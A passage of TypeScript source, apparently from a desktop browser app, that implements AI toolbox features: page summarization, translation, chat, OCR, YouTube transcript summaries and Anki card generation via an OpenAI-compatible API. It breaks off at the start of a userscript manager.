      modelEl.value = p.model;
    }
  });
  keyToggle?.addEventListener("click", () => {
    if (keyEl.type === "password") {
      keyEl.type = "text";
      keyToggle.textContent = "隠す";
    } else {
      keyEl.type = "password";
      keyToggle.textContent = "表示";
    }
  });
  saveBtn?.addEventListener("click", () => {
    saveAISettings({
      base: baseEl.value.trim(),
      model: modelEl.value.trim(),
      key: keyEl.value,
    });
    if (statusEl) statusEl.textContent = "設定を保存しました";
  });
  // 入力時にも自動保存 (キーは blur 時のみ)
  baseEl.addEventListener("change", () =>
    saveAISettings({
      base: baseEl.value.trim(),
      model: modelEl.value.trim(),
      key: keyEl.value,
    }),
  );
  modelEl.addEventListener("change", () =>
    saveAISettings({
      base: baseEl.value.trim(),
      model: modelEl.value.trim(),
      key: keyEl.value,
    }),
  );

  const setBusy = (busy: boolean): void => {
    [sumBtn, trBtn, tagBtn, buzzBtn, tldrBtn, askBtn].forEach((b) => {
      if (b) b.disabled = busy;
    });
    if (cancelBtn) cancelBtn.disabled = !busy;
  };

  cancelBtn?.addEventListener("click", () => {
    aiAbort?.abort();
    aiAbort = null;
    setBusy(false);
    if (statusEl) statusEl.textContent = "停止しました";
  });

  copyBtn?.addEventListener("click", async () => {
    if (!out.value) return;
    try {
      await navigator.clipboard.writeText(out.value);
      if (statusEl) statusEl.textContent = "コピーしました";
    } catch {
      if (statusEl) statusEl.textContent = "コピー失敗";
    }
  });
  dlBtn?.addEventListener("click", () => {
    if (!out.value) return;
    const blob = new Blob([out.value], { type: "text/markdown;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    const stamp = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
    a.href = url;
    a.download = `yuzu-ai-${stamp}.md`;
    document.body.appendChild(a);
    a.click();
    a.remove();
    setTimeout(() => URL.revokeObjectURL(url), 1000);
  });
  clearBtn?.addEventListener("click", () => {
    out.value = "";
    aiPageCache = null;
    if (statusEl) statusEl.textContent = "クリアしました";
  });

  /** 現在タブの本文を取得 (キャッシュあり) */
  const ensurePage = async (): Promise<{
    url: string;
    title: string;
    text: string;
  }> => {
    const a = activeTab();
    if (!a) throw new Error("アクティブなタブがありません");
    if (
      !fetchFresh?.checked &&
      aiPageCache &&
      aiPageCache.url === a.url &&
      aiPageCache.text
    ) {
      return aiPageCache;
    }
    if (!/^https?:\/\//i.test(a.url)) {
      throw new Error("http(s) のページのみ対応しています");
    }
    if (statusEl) statusEl.textContent = "ページを取得中…";
    const r = await invoke<ScrapeResult>("toolbox_scrape_fetch", {
      url: a.url,
      userAgent: null,
    });
    const { title, text } = extractMainText(r.body);
    const cache = { url: a.url, title: title || a.title || a.url, text };
    aiPageCache = cache;
    return cache;
  };

  const truncate = (s: string): string => {
    const max = Math.max(
      500,
      Math.min(200000, Number(maxCharsEl?.value) || 20000),
    );
    return s.length > max ? s.slice(0, max) + "\n\n[…以下省略]" : s;
  };

  const buildContext = (page: {
    url: string;
    title: string;
    text: string;
  }): string => {
    const parts: string[] = [];
    parts.push(`# タイトル\n${page.title}`);
    if (incUrl?.checked) parts.push(`# URL\n${page.url}`);
    parts.push(`# 本文\n${truncate(page.text)}`);
    return parts.join("\n\n");
  };

  const run = async (
    actionLabel: string,
    systemPrompt: string,
    userTemplate: (ctx: string) => string,
  ): Promise<void> => {
    const settings: AISettings = {
      base: baseEl.value.trim(),
      model: modelEl.value.trim(),
      key: keyEl.value,
    };
    if (!settings.base || !settings.model) {
      if (statusEl)
        statusEl.textContent = "Base URL とモデルを設定してください";
      return;
    }
    saveAISettings(settings);
    setBusy(true);
    aiAbort = new AbortController();
    try {
      const page = await ensurePage();
      const ctx = buildContext(page);
      if (statusEl)
        statusEl.textContent = `${actionLabel}中… (${page.text.length} chars)`;
      const streamEl = $id<HTMLInputElement>("ai-stream");
      const useStream = streamEl?.checked !== false;
      out.value = "";
      const onDelta = useStream
        ? (chunk: string): void => {
            out.value += chunk;
            out.scrollTop = out.scrollHeight;
          }
        : undefined;
      const result = await callOpenAICompatible(
        settings,
        [
          { role: "system", content: systemPrompt },
          { role: "user", content: userTemplate(ctx) },
        ],
        aiAbort.signal,
        onDelta,
      );
      if (!useStream) out.value = result.trim();
      if (statusEl) statusEl.textContent = `${actionLabel} 完了`;
    } catch (e) {
      if ((e as Error).name === "AbortError") return;
      if (statusEl) statusEl.textContent = `エラー: ${String(e)}`;
    } finally {
      setBusy(false);
      aiAbort = null;
    }
  };

  sumBtn?.addEventListener("click", () => {
    void run(
      "要約",
      "あなたは優秀な技術ライターです。Web ページの内容を読みやすい日本語の Markdown で要約してください。",
      (ctx) =>
        `次の Web ページを Markdown で要約してください。\n\n要件:\n- 冒頭に 2〜3 行の概要\n- ## 要点 セクションに箇条書きで 5〜8 個\n- ## 詳細 セクションに段落で深掘り\n- 末尾に ## キーワード として 5 個程度のタグ\n- 出力は Markdown のみ。前置きは不要。\n\n${ctx}`,
    );
  });
  tldrBtn?.addEventListener("click", () => {
    void run(
      "TL;DR",
      "あなたは要点抽出のプロです。回答は厳密に 3 行、絵文字なし、日本語。",
      (ctx) =>
        `次のページを 3 行で要約してください。各行は 60 文字以内。出力は箇条書き 3 行のみ。\n\n${ctx}`,
    );
  });
  trBtn?.addEventListener("click", () => {
    void run(
      "翻訳",
      "あなたは正確な翻訳者です。ページ本文を自然な日本語に翻訳して Markdown で返してください。",
      (ctx) =>
        `次の Web ページの本文を、見出し構造を保ったまま自然な日本語の Markdown に翻訳してください。固有名詞や URL はそのまま。前置き不要。\n\n${ctx}`,
    );
  });
  tagBtn?.addEventListener("click", () => {
    void run(
      "タグ抽出",
      "あなたは SEO/SNS マーケターです。日本語で簡潔に。",
      (ctx) =>
        `次のページから以下を Markdown で出力してください:\n\n## 主要キーワード\n- (10 個)\n\n## SEO 用ロングテール\n- (5 個)\n\n## SNS ハッシュタグ\n#tag1 #tag2 ... (10 個、半角 #、スペース区切り)\n\n${ctx}`,
    );
  });
  buzzBtn?.addEventListener("click", () => {
    void run(
      "SNS 文生成",
      "あなたは X (旧 Twitter) のバズ投稿を量産する SNS の達人です。釣りすぎず、要点を引き、続きが気になる書き方をします。",
      (ctx) =>
        `次のページを紹介するための SNS 投稿案を Markdown で 5 案出してください。\n\n各案:\n- 140 文字以内 (URL 含めず)\n- フック→要点→CTA の構成\n- 末尾に 2〜4 個のハッシュタグ\n- 1案ごとに見出し ### 案N (狙い: ...) を付け、本文をコードブロックで囲む\n\n${ctx}`,
    );
  });
  askBtn?.addEventListener("click", () => {
    const q = (questionEl?.value ?? "").trim();
    if (!q) {
      if (statusEl) statusEl.textContent = "質問を入力してください";
      return;
    }
    void run(
      "回答",
      "あなたは Web ページの内容に基づいて質問に答えるアシスタントです。ページに書かれていない事は推測せず、根拠が無ければそう述べてください。回答は日本語の Markdown。",
      (ctx) => `# 質問\n${q}\n\n# 参照ページ\n${ctx}`,
    );
  });
  questionEl?.addEventListener("keydown", (e) => {
    if (e.key === "Enter" && !e.isComposing) {
      e.preventDefault();
      askBtn?.click();
    }
  });

  setupAIExtras();
}

// ===== AI 拡張機能 =====

function getAISettingsOrAlert(
  statusFn?: (s: string) => void,
): AISettings | null {
  const s = loadAISettings();
  // 入力欄優先
  const baseEl = document.getElementById("ai-base") as HTMLInputElement | null;
  const modelEl = document.getElementById(
    "ai-model",
  ) as HTMLInputElement | null;
  const keyEl = document.getElementById("ai-key") as HTMLInputElement | null;
  const merged: AISettings = {
    base: (baseEl?.value || s.base).trim(),
    model: (modelEl?.value || s.model).trim(),
    key: keyEl?.value || s.key,
  };
  if (!merged.base || !merged.model) {
    statusFn?.("AI 設定 (Base URL / モデル) を入力してください");
    return null;
  }
  return merged;
}

async function aiEnsurePage(): Promise<{
  url: string;
  title: string;
  text: string;
}> {
  const a = activeTab();
  if (!a) throw new Error("アクティブなタブがありません");
  if (aiPageCache && aiPageCache.url === a.url && aiPageCache.text) {
    return aiPageCache;
  }
  if (!/^https?:\/\//i.test(a.url)) {
    throw new Error("http(s) のページのみ対応");
  }
  const r = await invoke<ScrapeResult>("toolbox_scrape_fetch", {
    url: a.url,
    userAgent: null,
  });
  const { title, text } = extractMainText(r.body);
  const cache = { url: a.url, title: title || a.title || a.url, text };
  aiPageCache = cache;
  return cache;
}

/** AI ツールセクションを開いて指定 ID にフォーカス */
function aiOpenTool(focusId?: string): void {
  void openToolboxPanel().then(() => {
    document
      .querySelectorAll<HTMLButtonElement>("#toolbox-nav .toolbox-nav-item")
      .forEach((b) => {
        b.classList.toggle("active", b.dataset.tool === "ai");
      });
    document
      .querySelectorAll<HTMLElement>("#toolbox-content .toolbox-tool")
      .forEach((s) => {
        s.hidden = s.dataset.tool !== "ai";
      });
    if (focusId) {
      const el = document.getElementById(focusId);
      if (el && "focus" in el) (el as HTMLElement).focus();
    }
  });
}

/** アドレスバーから "AI:..." で呼ばれた時の処理: AI ツールを開いて質問を流す */
async function runAIFromAddressBar(question: string): Promise<void> {
  aiOpenTool("ai-question");
  const qEl = document.getElementById("ai-question") as HTMLInputElement | null;
  if (qEl) qEl.value = question;
  // 質問ボタンクリック
  const askBtn = document.getElementById("ai-ask") as HTMLButtonElement | null;
  setTimeout(() => askBtn?.click(), 100);
}

/** ストリーミング対応の汎用呼び出し (出力先 textarea を渡す) */
async function aiInvoke(
  out: HTMLTextAreaElement,
  systemPrompt: string,
  user: string | AIChatMessage[],
  statusFn?: (s: string) => void,
  forceModel?: string,
): Promise<string> {
  const settings = getAISettingsOrAlert(statusFn);
  if (!settings) return "";
  if (forceModel) settings.model = forceModel;
  aiAbort?.abort();
  aiAbort = new AbortController();
  const streamEl = document.getElementById(
    "ai-stream",
  ) as HTMLInputElement | null;
  const useStream = streamEl?.checked !== false;
  out.value = "";
  const messages: AIChatMessage[] = Array.isArray(user)
    ? [{ role: "system", content: systemPrompt }, ...user]
    : [
        { role: "system", content: systemPrompt },
        { role: "user", content: user },
      ];
  try {
    const result = await callOpenAICompatible(
      settings,
      messages,
      aiAbort.signal,
      useStream
        ? (chunk) => {
            out.value += chunk;
            out.scrollTop = out.scrollHeight;
          }
        : undefined,
    );
    if (!useStream) out.value = result.trim();
    statusFn?.("完了");
    return out.value;
  } catch (e) {
    if ((e as Error).name === "AbortError") return "";
    statusFn?.(`エラー: ${String(e)}`);
    return "";
  } finally {
    aiAbort = null;
  }
}

function setupAIExtras(): void {
  setupAIChat();
  setupAITextOps();
  setupAIMedia();
  // setupAIMultiTranslate(); // 多言語翻訳は廃止
  setupAIAnki();
}

// --- 💬 チャット ---

interface ChatTurn {
  role: "user" | "assistant";
  content: string;
}
const aiChatHistory: ChatTurn[] = [];
let aiChatPageUrl: string | null = null;

function renderChatLog(): void {
  const log = document.getElementById("ai-chat-log");
  if (!log) return;
  log.innerHTML = "";
  for (const t of aiChatHistory) {
    const row = document.createElement("div");
    row.style.marginBottom = "8px";
    const who = document.createElement("strong");
    who.textContent = t.role === "user" ? "🧑 You: " : "🤖 AI: ";
    who.style.color = t.role === "user" ? "#4a9" : "#a94";
    row.appendChild(who);
    const txt = document.createElement("span");
    txt.textContent = t.content;
    row.appendChild(txt);
    log.appendChild(row);
  }
  log.scrollTop = log.scrollHeight;
}

function setupAIChat(): void {
  const input = document.getElementById(
    "ai-chat-input",
  ) as HTMLInputElement | null;
  const sendBtn = document.getElementById(
    "ai-chat-send",
  ) as HTMLButtonElement | null;
  const clearBtn = document.getElementById(
    "ai-chat-clear",
  ) as HTMLButtonElement | null;
  const log = document.getElementById("ai-chat-log") as HTMLDivElement | null;
  if (!input || !sendBtn || !log) return;

  clearBtn?.addEventListener("click", () => {
    aiChatHistory.length = 0;
    aiChatPageUrl = null;
    renderChatLog();
  });

  const send = async (): Promise<void> => {
    const q = input.value.trim();
    if (!q) return;
    input.value = "";
    sendBtn.disabled = true;
    try {
      const page = await aiEnsurePage();
      // ページ変更で履歴リセット (推奨)
      if (aiChatPageUrl && aiChatPageUrl !== page.url) {
        aiChatHistory.length = 0;
      }
      aiChatPageUrl = page.url;
      aiChatHistory.push({ role: "user", content: q });
      renderChatLog();

      const settings = getAISettingsOrAlert((s) => {
        log.innerHTML = `<em>${s}</em>`;
      });
      if (!settings) return;

      // システムは初回だけページコンテキストを含めた長文、以降は履歴ベース
      const sys = `あなたは親切な日本語アシスタントです。以下の Web ページを読んだ上で、ユーザーと連続して会話してください。ページに無い事は推測せず、根拠が無ければそう述べる。\n\n# ページタイトル\n${page.title}\n# URL\n${page.url}\n# 本文 (一部抜粋)\n${page.text.slice(0, 16000)}`;
      const messages: AIChatMessage[] = [
        { role: "system", content: sys },
        ...aiChatHistory.map<AIChatMessage>((t) => ({
          role: t.role,
          content: t.content,
        })),
      ];

      // ストリーミング表示用に仮のアシスタントターンを追加
      aiChatHistory.push({ role: "assistant", content: "" });
      renderChatLog();
      const lastIdx = aiChatHistory.length - 1;

      aiAbort?.abort();
      aiAbort = new AbortController();
      const streamEl = document.getElementById(
        "ai-stream",
      ) as HTMLInputElement | null;
      const useStream = streamEl?.checked !== false;
      try {
        const result = await callOpenAICompatible(
          settings,
          messages,
          aiAbort.signal,
          useStream
            ? (chunk) => {
                aiChatHistory[lastIdx].content += chunk;
                renderChatLog();
              }
            : undefined,
        );
        if (!useStream) {
          aiChatHistory[lastIdx].content = result.trim();
          renderChatLog();
        }
      } catch (e) {
        if ((e as Error).name !== "AbortError") {
          aiChatHistory[lastIdx].content = `[エラー] ${String(e)}`;
          renderChatLog();
        }
      } finally {
        aiAbort = null;
      }
    } catch (e) {
      log.innerHTML = `<em>エラー: ${String(e)}</em>`;
    } finally {
      sendBtn.disabled = false;
    }
  };

  sendBtn.addEventListener("click", () => void send());
  input.addEventListener("keydown", (e) => {
    if (e.key === "Enter" && !e.isComposing) {
      e.preventDefault();
      void send();
    }
  });
}

// --- 📋 テキスト操作 ---

function setupAITextOps(): void {
  const ta = document.getElementById(
    "ai-text-input",
  ) as HTMLTextAreaElement | null;
  const out = document.getElementById(
    "ai-output",
  ) as HTMLTextAreaElement | null;
  const statusEl = document.getElementById(
    "ai-status",
  ) as HTMLSpanElement | null;
  const status = (s: string): void => {
    if (statusEl) statusEl.textContent = s;
  };
  if (!ta || !out) return;

  document
    .getElementById("ai-text-paste")
    ?.addEventListener("click", async () => {
      try {
        const t = await navigator.clipboard.readText();
        ta.value = t;
        status(`貼り付け ${t.length} 文字`);
      } catch {
        status("クリップボードを読めません");
      }
    });
  document.getElementById("ai-text-clear")?.addEventListener("click", () => {
    ta.value = "";
  });

  const requireText = (): string | null => {
    const t = ta.value.trim();
    if (!t) {
      status("テキストを入力してください");
      return null;
    }
    return t;
  };

  document
    .getElementById("ai-text-translate")
    ?.addEventListener("click", () => {
      const t = requireText();
      if (!t) return;
      void aiInvoke(
        out,
        "あなたは正確で自然な翻訳者です。原文の言語を自動判定して日本語に翻訳。前置き不要。",
        `次のテキストを日本語に翻訳してください:\n\n${t}`,
        status,
      );
    });
  document.getElementById("ai-text-explain")?.addEventListener("click", () => {
    const t = requireText();
    if (!t) return;
    void aiInvoke(
      out,
      "あなたは分かりやすい日本語の解説者です。中学生にも分かるように。",
      `次のテキストを日本語で噛み砕いて解説してください。専門用語は (補足) で簡潔に説明。\n\n${t}`,
      status,
    );
  });
  document.getElementById("ai-text-rewrite")?.addEventListener("click", () => {
    const t = requireText();
    if (!t) return;
    void aiInvoke(
      out,
      "あなたは文章校正の専門家です。意味を変えずに自然で読みやすい日本語にします。",
      `次の文章を、意味を変えずに自然な日本語に書き直してください。誤字脱字も修正。出力は本文のみ。\n\n${t}`,
      status,
    );
  });
  document.getElementById("ai-text-code")?.addEventListener("click", () => {
    const t = requireText();
    if (!t) return;
    const lang =
      (
        document.getElementById("ai-code-lang") as HTMLInputElement | null
      )?.value.trim() || "auto";
    void aiInvoke(
      out,
      "あなたは熟練のソフトウェアエンジニアです。コードを正確に日本語で説明します。",
      `次のコード (言語: ${lang}) を Markdown で説明してください。\n\n# 出力フォーマット\n## 概要\n## 行ごとの解説 (重要箇所のみ)\n## 注意点 / バグ可能性\n## より良い書き方の提案 (あれば)\n\n\`\`\`${lang === "auto" ? "" : lang}\n${t}\n\`\`\``,
      status,
    );
  });
  document.getElementById("ai-text-json")?.addEventListener("click", () => {
    const t = requireText();
    if (!t) return;
    void aiInvoke(
      out,
      "あなたは API/データ構造の解説者です。",
      `次の JSON/データ構造を日本語で説明してください。\n\n# 出力\n## 概要\n## フィールド一覧 (Markdown 表: 名前 | 型 | 意味)\n## サンプル用途\n\n\`\`\`json\n${t}\n\`\`\``,
      status,
    );
  });
  document.getElementById("ai-text-mail")?.addEventListener("click", () => {
    const t = requireText();
    if (!t) return;
    const tone =
      (document.getElementById("ai-mail-tone") as HTMLSelectElement | null)
        ?.value || "ビジネス丁寧";
    void aiInvoke(
      out,
      "あなたは日本語ビジネスメールのプロです。簡潔・敬意・要点を明確に。",
      `次の受信メールに対する返信案を「${tone}」のトーンで 2 案作ってください。\n\n# 出力\n## 案1\n件名: ...\n本文:\n...\n\n## 案2\n件名: ...\n本文:\n...\n\n# 受信メール\n${t}`,
      status,
    );
  });
}

// --- 🎬 メディア (YouTube / 画像 Vision / ファイル) ---

async function fetchYoutubeTranscript(videoUrl: string): Promise<string> {
  const m =
    videoUrl.match(/[?&]v=([\w-]{11})/) ||
    videoUrl.match(/youtu\.be\/([\w-]{11})/);
  if (!m) throw new Error("YouTube 動画 URL ではありません");
  const id = m[1];
  // ページ HTML から captionTracks を取り出す
  const watch = await invoke<ScrapeResult>("toolbox_scrape_fetch", {
    url: `https://www.youtube.com/watch?v=${id}`,
    userAgent: null,
  });
  const html = watch.body;
  const tracksMatch = html.match(/"captionTracks":(\[.*?\])/);
  if (!tracksMatch) throw new Error("字幕トラックが見つかりません");
  let tracks: { baseUrl: string; languageCode?: string; vssId?: string }[] = [];
  try {
    tracks = JSON.parse(tracksMatch[1].replace(/\\u0026/g, "&"));
  } catch {
    throw new Error("字幕トラックの解析に失敗");
  }
  if (tracks.length === 0) throw new Error("字幕がありません");
  // ja → en → 先頭 の優先で選ぶ
  const pick =
    tracks.find((t) => t.languageCode === "ja") ||
    tracks.find((t) => t.languageCode === "en") ||
    tracks[0];
  const url = pick.baseUrl.replace(/&fmt=\w+/, "") + "&fmt=vtt";
  const r = await invoke<ScrapeResult>("toolbox_scrape_fetch", {
    url,
    userAgent: null,
  });
  // VTT → プレーンテキスト
  const lines: string[] = [];
  for (const line of r.body.split(/\r?\n/)) {
    const t = line.trim();
    if (!t) continue;
    if (/^WEBVTT/.test(t)) continue;
    if (/^\d+$/.test(t)) continue;
    if (/-->/.test(t)) continue;
    if (/^NOTE\b/.test(t)) continue;
    if (/^STYLE/.test(t)) continue;
    lines.push(t.replace(/<[^>]+>/g, ""));
  }
  return lines.join(" ").replace(/\s+/g, " ").trim();
}

async function fileToDataUrl(file: File): Promise<string> {
  return new Promise((resolve, reject) => {
    const fr = new FileReader();
    fr.onload = () => resolve(String(fr.result));
    fr.onerror = () => reject(fr.error);
    fr.readAsDataURL(file);
  });
}

async function fileToText(file: File): Promise<string> {
  return new Promise((resolve, reject) => {
    const fr = new FileReader();
    fr.onload = () => resolve(String(fr.result));
    fr.onerror = () => reject(fr.error);
    fr.readAsText(file);
  });
}

function setupAIMedia(): void {
  const out = document.getElementById(
    "ai-output",
  ) as HTMLTextAreaElement | null;
  const statusEl = document.getElementById(
    "ai-status",
  ) as HTMLSpanElement | null;
  const status = (s: string): void => {
    if (statusEl) statusEl.textContent = s;
  };
  if (!out) return;

  document
    .getElementById("ai-yt-summarize")
    ?.addEventListener("click", async () => {
      const a = activeTab();
      if (!a) {
        status("アクティブなタブがありません");
        return;
      }
      status("YouTube 字幕取得中…");
      try {
        const transcript = await fetchYoutubeTranscript(a.url);
        const max = 30000;
        const text =
          transcript.length > max
            ? transcript.slice(0, max) + " […省略]"
            : transcript;
        void aiInvoke(
          out,
          "あなたは動画内容の要約者です。冗長な相槌は省き、要点を構造化して日本語 Markdown で返します。",
          `以下は YouTube 動画の字幕全文です。日本語で要約してください。\n\n# 出力\n## 一言でいうと\n## 章立て要約 (5〜10 個、見出し+1〜2 行)\n## 重要キーワード\n## 結論 / 学び\n\n# 字幕\n${text}`,
          status,
        );
      } catch (e) {
        status(`エラー: ${String(e)}`);
      }
    });

  const imgFile = document.getElementById(
    "ai-image-file",
  ) as HTMLInputElement | null;

  const runVision = async (
    prompt: string,
    sysPrompt: string,
  ): Promise<void> => {
    const f = imgFile?.files?.[0];
    if (!f) {
      status("画像を選択してください");
      return;
    }
    status("画像を送信中…");
    try {
      const dataUrl = await fileToDataUrl(f);
      void aiInvoke(
        out,
        sysPrompt,
        [
          {
            role: "user",
            content: [
              { type: "text", text: prompt },
              { type: "image_url", image_url: { url: dataUrl } },
            ],
          },
        ],
        status,
      );
    } catch (e) {
      status(`エラー: ${String(e)}`);
    }
  };

  document.getElementById("ai-image-ocr")?.addEventListener("click", () => {
    void runVision(
      "この画像に写っている全てのテキストを正確に書き起こしてください。レイアウトは保ちつつ、純粋なテキストのみを返してください。前置き不要。",
      "あなたは高精度 OCR エンジンです。",
    );
  });
  document
    .getElementById("ai-image-describe")
    ?.addEventListener("click", () => {
      void runVision(
        "この画像の内容を日本語で詳細に説明してください。被写体・構図・推測される文脈・読み取れるテキストの順で。",
        "あなたは画像の説明者です。日本語で。",
      );
    });

  const fileEl = document.getElementById(
    "ai-file-input",
  ) as HTMLInputElement | null;
  document
    .getElementById("ai-file-summarize")
    ?.addEventListener("click", async () => {
      const f = fileEl?.files?.[0];
      if (!f) {
        status("ファイルを選択してください");
        return;
      }
      status(`ファイル読込中 (${f.name})…`);
      try {
        let text = await fileToText(f);
        // HTML 系は本文抽出
        if (/\.html?$/i.test(f.name)) {
          text = extractMainText(text).text;
        }
        // SRT/VTT は時刻削除
        if (/\.(srt|vtt)$/i.test(f.name)) {
          text = text
            .split(/\r?\n/)
            .filter(
              (l) =>
                l.trim() &&
                !/^\d+$/.test(l.trim()) &&
                !/-->/.test(l) &&
                !/^WEBVTT/.test(l),
            )
            .join(" ");
        }
        const max = 60000;
        if (text.length > max) text = text.slice(0, max) + "\n\n[…以下省略]";
        void aiInvoke(
          out,
          "あなたは正確な要約者です。日本語 Markdown で簡潔に。",
          `次のファイル (${f.name}) を日本語で要約してください。\n\n# 出力\n## 概要 (3 行)\n## 要点\n## 詳細\n## キーワード\n\n# 内容\n${text}`,
          status,
        );
      } catch (e) {
        status(`エラー: ${String(e)}`);
      }
    });
}

// --- 🌍 多言語翻訳 (新タブ) ---

function setupAIMultiTranslate(): void {
  const goBtn = document.getElementById("ai-mt-go") as HTMLButtonElement | null;
  const langSel = document.getElementById(
    "ai-mt-lang",
  ) as HTMLSelectElement | null;
  const parallelEl = document.getElementById(
    "ai-mt-parallel",
  ) as HTMLInputElement | null;
  const statusEl = document.getElementById(
    "ai-status",
  ) as HTMLSpanElement | null;
  const status = (s: string): void => {
    if (statusEl) statusEl.textContent = s;
  };
  if (!goBtn || !langSel) return;

  goBtn.addEventListener("click", async () => {
    const lang = langSel.value;
    const parallel = !!parallelEl?.checked;
    const settings = getAISettingsOrAlert(status);
    if (!settings) return;
    try {
      status(`${lang} に翻訳中…`);
      const page = await aiEnsurePage();
      const max = 30000;
      const src =
        page.text.length > max
          ? page.text.slice(0, max) + " […省略]"
          : page.text;
      aiAbort?.abort();
      aiAbort = new AbortController();
      const result = await callOpenAICompatible(
        settings,
        [
          {
            role: "system",
            content: `あなたは正確な翻訳者です。出力は ${lang} のみ。前置きや解説は不要。Markdown 構造を保つ。`,
          },
          {
            role: "user",
            content: `次のページを ${lang} に翻訳してください。\n\n# タイトル\n${page.title}\n\n# 本文\n${src}`,
          },
        ],
        aiAbort.signal,
      );
      aiAbort = null;
      const escaped = (s: string): string =>
        s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
      const body = parallel
        ? `<div class="col"><h2>原文</h2><pre>${escaped(page.text.slice(0, max))}</pre></div><div class="col"><h2>${escaped(lang)}</h2><pre>${escaped(result)}</pre></div>`
        : `<div class="col full"><h2>${escaped(lang)}</h2><pre>${escaped(result)}</pre></div>`;
      const html = `<!doctype html><html lang="ja"><head><meta charset="utf-8"><title>${escaped(page.title)} - ${escaped(lang)} 翻訳</title>
<style>
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;margin:0;padding:16px;background:#fafafa;color:#222;line-height:1.7}
h1{font-size:18px;margin:0 0 12px}
h2{font-size:14px;margin:0 0 8px;color:#666;border-bottom:1px solid #ddd;padding-bottom:4px}
.wrap{display:flex;gap:16px}
.col{flex:1;min-width:0;background:#fff;border:1px solid #e0e0e0;border-radius:8px;padding:12px}
.col.full{flex:1}
pre{white-space:pre-wrap;word-wrap:break-word;font-family:inherit;margin:0;font-size:14px}
.src{font-size:12px;color:#888;margin-bottom:12px}
.src a{color:#48a}
</style></head><body>
<h1>🌍 ${escaped(lang)} 翻訳</h1>
<div class="src">原文: <a href="${escaped(page.url)}">${escaped(page.url)}</a></div>
<div class="wrap">${body}</div>
</body></html>`;
      const dataUrl =
        "data:text/html;charset=utf-8;base64," +
        btoa(unescape(encodeURIComponent(html)));
      await tabNew(dataUrl);
      status(`${lang} 翻訳タブを開きました`);
    } catch (e) {
      if ((e as Error).name !== "AbortError") status(`エラー: ${String(e)}`);
    }
  });
}

// --- 🎴 Anki カード ---

let aiAnkiLastCsv = "";

function setupAIAnki(): void {
  const goBtn = document.getElementById(
    "ai-anki-go",
  ) as HTMLButtonElement | null;
  const csvBtn = document.getElementById(
    "ai-anki-csv",
  ) as HTMLButtonElement | null;
  const out = document.getElementById(
    "ai-output",
  ) as HTMLTextAreaElement | null;
  const statusEl = document.getElementById(
    "ai-status",
  ) as HTMLSpanElement | null;
  const status = (s: string): void => {
    if (statusEl) statusEl.textContent = s;
  };
  if (!goBtn || !out) return;

  goBtn.addEventListener("click", async () => {
    const count = Math.max(
      3,
      Math.min(
        40,
        Number(
          (document.getElementById("ai-anki-count") as HTMLInputElement | null)
            ?.value,
        ) || 10,
      ),
    );
    const level =
      (document.getElementById("ai-anki-level") as HTMLSelectElement | null)
        ?.value || "標準";
    try {
      status("ページ取得中…");
      const page = await aiEnsurePage();
      const text = await aiInvoke(
        out,
        "あなたは熟練の学習設計者です。出力は厳密に JSON 配列のみ (前置きや ``` も付けない)。各要素は { front, back } の 2 フィールドだけ。",
        `次のページから「${level}」レベルの暗記カードを ${count} 枚生成してください。\n- front: 50 文字以内の問い\n- back: 200 文字以内の答え (具体的に)\n- 重複を避け、ページ内容に基づく事実のみ\n\n# ページタイトル\n${page.title}\n\n# 本文\n${page.text.slice(0, 30000)}`,
        status,
      );
      // JSON 抽出
      const m = text.match(/\[[\s\S]*\]/);
      if (!m) {
        status("JSON が抽出できませんでした");
        return;
      }
      const cards = JSON.parse(m[0]) as { front: string; back: string }[];
      const csv = cards
        .filter((c) => c && c.front && c.back)
        .map(
          (c) =>
            `${c.front.replace(/[\t\r\n]/g, " ")}\t${c.back.replace(/[\t\r\n]/g, " ")}`,
        )
        .join("\n");
      aiAnkiLastCsv = csv;
      out.value = `# ${cards.length} 枚生成しました\n\n${cards
        .map((c, i) => `## ${i + 1}. ${c.front}\n${c.back}`)
        .join(
          "\n\n",
        )}\n\n---\n\n# Anki 用 TSV (CSV ボタンで保存)\n\n\`\`\`\n${csv}\n\`\`\``;
      status(`${cards.length} 枚生成完了`);
    } catch (e) {
      status(`エラー: ${String(e)}`);
    }
  });

  csvBtn?.addEventListener("click", () => {
    if (!aiAnkiLastCsv) {
      status("先にカードを生成してください");
      return;
    }
    const blob = new Blob([aiAnkiLastCsv], {
      type: "text/tab-separated-values;charset=utf-8",
    });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    const stamp = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
    a.href = url;
    a.download = `anki-${stamp}.tsv`;
    document.body.appendChild(a);
    a.click();
    a.remove();
    setTimeout(() => URL.revokeObjectURL(url), 1000);
  });
}

// ===== 🐵 ユーザースクリプト (Tampermonkey 風) =====

interface UserScript {
  id: string;
  name: string;
  source: string;
  enabled: boolean;
  updatedAt: number;
}

interface UserScriptMeta {
  name: string;
  matches: string[];
  excludes: string[];
  runAt: "document-start" | "document-end" | "document-idle";
  grants: string[];
  noFrames: boolean;
}

const US_STORAGE_KEY = "yuzu-userscripts-v1";
const US_MASTER_KEY = "yuzu-userscripts-enabled-v1";
const US_GM_VALUES_PREFIX = "yuzu-gm-values-";

let userScripts: UserScript[] = [];
let usSelectedId: string | null = null;

function loadUserScripts(): UserScript[] {
  try {
    const raw = localStorage.getItem(US_STORAGE_KEY);
    if (!raw) return [];
    const arr = JSON.parse(raw) as UserScript[];
    if (!Array.isArray(arr)) return [];
    return arr.filter((s) => s && typeof s.source === "string");
  } catch {
    return [];
  }
}

function saveUserScripts(): void {
  try {
    localStorage.setItem(US_STORAGE_KEY, JSON.stringify(userScripts));
  } catch (e) {
    console.error("saveUserScripts failed:", e);
  }
}

function isUserScriptsEnabled(): boolean {
  return localStorage.getItem(US_MASTER_KEY) !== "0";
}

function setUserScriptsEnabled(b: boolean): void {
  localStorage.setItem(US_MASTER_KEY, b ? "1" : "0");
}

/** Greasemonkey ヘッダのパース */
function parseUserScriptMeta(source: string): UserScriptMeta {
  const meta: UserScriptMeta = {
    name: "",
    matches: [],
    excludes: [],
    runAt: "document-end",
    grants: [],
    noFrames: false,
  };
  const headerMatch = source.match(
    /\/\/\s*==UserScript==([\s\S]*?)\/\/\s*==\/UserScript==/,
  );
  if (!headerMatch) return meta;
  const lines = headerMatch[1].split(/\r?\n/);
  for (const line of lines) {
